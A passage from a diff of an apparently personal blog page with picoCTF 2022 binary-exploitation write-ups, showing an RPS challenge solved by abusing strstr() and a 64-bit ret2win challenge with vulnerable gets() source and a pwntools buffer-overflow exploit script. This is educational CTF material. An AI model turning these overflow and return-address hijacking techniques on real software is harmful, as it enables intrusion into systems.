+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
 </code></pre><h2 id="rps">RPS</h2>
 <h3 id="description-6">Description</h3>
 <p>Here&rsquo;s a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.</p>
 <p>This challenge provided a C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;stdbool.h&gt;
-#include &lt;string.h&gt;
-#include &lt;time.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/time.h&gt;
-#include &lt;sys/types.h&gt;
-
-
-#define WAIT 60
-
-
-
-static const char* flag = &#34;[REDACTED]&#34;;
-
-char* hands[3] = {&#34;rock&#34;, &#34;paper&#34;, &#34;scissors&#34;};
-char* loses[3] = {&#34;paper&#34;, &#34;scissors&#34;, &#34;rock&#34;};
-int wins = 0;
-
-
-
-int tgetinput(char *input, unsigned int l)
-{
-    fd_set          input_set;
-    struct timeval  timeout;
-    int             ready_for_reading = 0;
-    int             read_bytes = 0;
-    
-    if( l &lt;= 0 )
-    {
-      printf(&#34;&#39;l&#39; for tgetinput must be greater than 0\n&#34;);
-      return -2;
-    }
-    
-    
-    /* Empty the FD Set */
-    FD_ZERO(&amp;input_set );
-    /* Listen to the input descriptor */
-    FD_SET(STDIN_FILENO, &amp;input_set);
-
-    /* Waiting for some seconds */
-    timeout.tv_sec = WAIT;    // WAIT seconds
-    timeout.tv_usec = 0;    // 0 milliseconds
-
-    /* Listening for input stream for any activity */
-    ready_for_reading = select(1, &amp;input_set, NULL, NULL, &amp;timeout);
-    /* Here, first parameter is number of FDs in the set, 
-     * second is our FD set for reading,
-     * third is the FD set in which any write activity needs to updated,
-     * which is not required in this case. 
-     * Fourth is timeout
-     */
-
-    if (ready_for_reading == -1) {
-        /* Some error has occured in input */
-        printf(&#34;Unable to read your input\n&#34;);
-        return -1;
-    } 
-
-    if (ready_for_reading) {
-        read_bytes = read(0, input, l-1);
-        if(input[read_bytes-1]==&#39;\n&#39;){
-        --read_bytes;
-        input[read_bytes]=&#39;\0&#39;;
-        }
-        if(read_bytes==0){
-            printf(&#34;No data given.\n&#34;);
-            return -4;
-        } else {
-            return 0;
-        }
-    } else {
-        printf(&#34;Timed out waiting for user input. Press Ctrl-C to disconnect\n&#34;);
-        return -3;
-    }
-
-    return 0;
-}
-
-
-bool play () {
-  char player_turn[100];
-  srand(time(0));
-  int r;
-
-  printf(&#34;Please make your selection (rock/paper/scissors):\n&#34;);
-  r = tgetinput(player_turn, 100);
-  // Timeout on user input
-  if(r == -3)
-  {
-    printf(&#34;Goodbye!\n&#34;);
-    exit(0);
-  }
-
-  int computer_turn = rand() % 3;
-  printf(&#34;You played: %s\n&#34;, player_turn);
-  printf(&#34;The computer played: %s\n&#34;, hands[computer_turn]);
-
-  if (strstr(player_turn, loses[computer_turn])) {
-    puts(&#34;You win! Play again?&#34;);
-    return true;
-  } else {
-    puts(&#34;Seems like you didn&#39;t win this time. Play again?&#34;);
-    return false;
-  }
-}
-
-
-int main () {
-  char input[3] = {&#39;\0&#39;};
-  int command;
-  int r;
-
-  puts(&#34;Welcome challenger to the game of Rock, Paper, Scissors&#34;);
-  puts(&#34;For anyone that beats me 5 times in a row, I will offer up a flag I found&#34;);
-  puts(&#34;Are you ready?&#34;);
-  
-  while (true) {
-    puts(&#34;Type &#39;1&#39; to play a game&#34;);
-    puts(&#34;Type &#39;2&#39; to exit the program&#34;);
-    r = tgetinput(input, 3);
-    // Timeout on user input
-    if(r == -3)
-    {
-      printf(&#34;Goodbye!\n&#34;);
-      exit(0);
-    }
-    
-    if ((command = strtol(input, NULL, 10)) == 0) {
-      puts(&#34;Please put in a valid number&#34;);
-      
-    } else if (command == 1) {
-      printf(&#34;\n\n&#34;);
-      if (play()) {
-        wins++;
-      } else {
-        wins = 0;
-      }
-
-      if (wins &gt;= 5) {
-        puts(&#34;Congrats, here&#39;s the flag!&#34;);
-        puts(flag);
-      }
-    } else if (command == 2) {
-      return 0;
-    } else {
-      puts(&#34;Please type either 1 or 2&#34;);
-    }
-  }
-
-  return 0;
-}
-</code></pre><p>From the source code we can see this is a Rock-Paper-Scissors game, and to get the flag, we need to win 5 times in a row. However, we can see it use this piece on code to compare our input to determine whether we win or lose:</p>
-<pre tabindex="0"><code>if (strstr(player_turn, loses[computer_turn])) {
-  puts(&#34;You win! Play again?&#34;);
-  return true;
-} else {
-  puts(&#34;Seems like you didn&#39;t win this time. Play again?&#34;);
-  return false;
-}
-</code></pre><p>The <code>strstr()</code> function will return the first occurrence of string that found, which means that we keep winning by inputting the ultimate answer as below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define WAIT 60
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[REDACTED]&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> hands[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;rock&#34;</span>, <span style="color:#e6db74">&#34;paper&#34;</span>, <span style="color:#e6db74">&#34;scissors&#34;</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> loses[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;paper&#34;</span>, <span style="color:#e6db74">&#34;scissors&#34;</span>, <span style="color:#e6db74">&#34;rock&#34;</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> wins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tgetinput</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> l)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    fd_set          input_set;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> timeval  timeout;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>             ready_for_reading <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>             read_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( l <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;&#39;l&#39; for tgetinput must be greater than 0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Empty the FD Set */</span>
+</span></span><span style="display:flex;"><span>    FD_ZERO(<span style="color:#f92672">&amp;</span>input_set );
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Listen to the input descriptor */</span>
+</span></span><span style="display:flex;"><span>    FD_SET(STDIN_FILENO, <span style="color:#f92672">&amp;</span>input_set);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Waiting for some seconds */</span>
+</span></span><span style="display:flex;"><span>    timeout.tv_sec <span style="color:#f92672">=</span> WAIT;    <span style="color:#75715e">// WAIT seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    timeout.tv_usec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;    <span style="color:#75715e">// 0 milliseconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Listening for input stream for any activity */</span>
+</span></span><span style="display:flex;"><span>    ready_for_reading <span style="color:#f92672">=</span> select(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>input_set, NULL, NULL, <span style="color:#f92672">&amp;</span>timeout);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Here, first parameter is number of FDs in the set, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * second is our FD set for reading,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * third is the FD set in which any write activity needs to updated,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * which is not required in this case. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Fourth is timeout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ready_for_reading <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Some error has occured in input */</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Unable to read your input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ready_for_reading) {
+</span></span><span style="display:flex;"><span>        read_bytes <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, input, l<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(input[read_bytes<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;\n&#39;</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">--</span>read_bytes;
+</span></span><span style="display:flex;"><span>        input[read_bytes]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(read_bytes<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;No data given.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Timed out waiting for user input. Press Ctrl-C to disconnect</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">play</span> () {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> player_turn[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  srand(time(<span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Please make your selection (rock/paper/scissors):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  r <span style="color:#f92672">=</span> tgetinput(player_turn, <span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> computer_turn <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;You played: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, player_turn);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;The computer played: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hands[computer_turn]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (strstr(player_turn, loses[computer_turn])) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;You win! Play again?&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Seems like you didn&#39;t win this time. Play again?&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> () {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;\0&#39;</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> command;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Welcome challenger to the game of Rock, Paper, Scissors&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;For anyone that beats me 5 times in a row, I will offer up a flag I found&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Are you ready?&#34;</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Type &#39;1&#39; to play a game&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Type &#39;2&#39; to exit the program&#34;</span>);
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> tgetinput(input, <span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((command <span style="color:#f92672">=</span> strtol(input, NULL, <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Please put in a valid number&#34;</span>);
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (command <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (play()) {
+</span></span><span style="display:flex;"><span>        wins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        wins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (wins <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5</span>) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Congrats, here&#39;s the flag!&#34;</span>);
+</span></span><span style="display:flex;"><span>        puts(flag);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (command <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Please type either 1 or 2&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code we can see this is a Rock-Paper-Scissors game, and to get the flag, we need to win 5 times in a row. However, we can see it use this piece on code to compare our input to determine whether we win or lose:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (strstr(player_turn, loses[computer_turn])) {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You win! Play again?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Seems like you didn&#39;t win this time. Play again?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>strstr()</code> function will return the first occurrence of string that found, which means that we keep winning by inputting the ultimate answer as below:</p>
 <pre tabindex="0"><code>rockpaperscissors
 </code></pre><p><img src="/img/picoctf2022-binexp/rps.png" alt="IMG"></p>
 <p>Flag:</p>
@@ -992,97 +992,97 @@ int main () {
 <h3 id="description-7">Description</h3>
 <p>Overflow x64 code Most problems before this are 32-bit x86. Now we&rsquo;ll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-
-#define BUFFSIZE 64
-#define FLAGSIZE 64
-
-void flag() {
-  char buf[FLAGSIZE];
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-
-  fgets(buf,FLAGSIZE,f);
-  printf(buf);
-}
-
-void vuln(){
-  char buf[BUFFSIZE];
-  gets(buf);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-  puts(&#34;Welcome to 64-bit. Give me a string that gets you the flag: &#34;);
-  vuln();
-  return 0;
-}
-</code></pre><p>From the source code we can see this is a typical ret2win challenge again, but in 64-bit. Below is the script to get the flag, <code>0x40123b</code> is the address of flag function which can be obtain by using Ghidra:</p>
-<pre tabindex="0"><code>from pwn import *
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = &#39;&#39;&#39;
-init-pwndbg
-continue
-&#39;&#39;&#39;.format(**locals())
-
-
-# Set up pwntools for the correct architecture
-exe = &#39;./vuln&#39;
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = &#39;error&#39;
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-io = start()
-
-rip_offset = 72 
-info(&#39;located RIP offset at {a}&#39;.format(a=rip_offset))
-
-# Build payload
-payload = flat({
-    rip_offset: p64(0x40123b)
-})
-
-# Save payload to file
-write(&#39;payload&#39;, payload)
-
-# Start a new process
-io = start()
-
-# PWN
-io.sendlineafter(b&#34;flag: \n&#34;, payload)
-print(io.recv())
-# Receive the flag
-io.interactive()
-</code></pre><p><img src="/img/picoctf2022-binexp/x-sixty-what.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fgets(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  printf(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFFSIZE];
+</span></span><span style="display:flex;"><span>  gets(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Welcome to 64-bit. Give me a string that gets you the flag: &#34;</span>);
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code we can see this is a typical ret2win challenge again, but in 64-bit. Below is the script to get the flag, <code>0x40123b</code> is the address of flag function which can be obtain by using Ghidra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allows you to switch between local/GDB/remote from terminal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:  <span style="color:#75715e"># Set GDBscript below</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
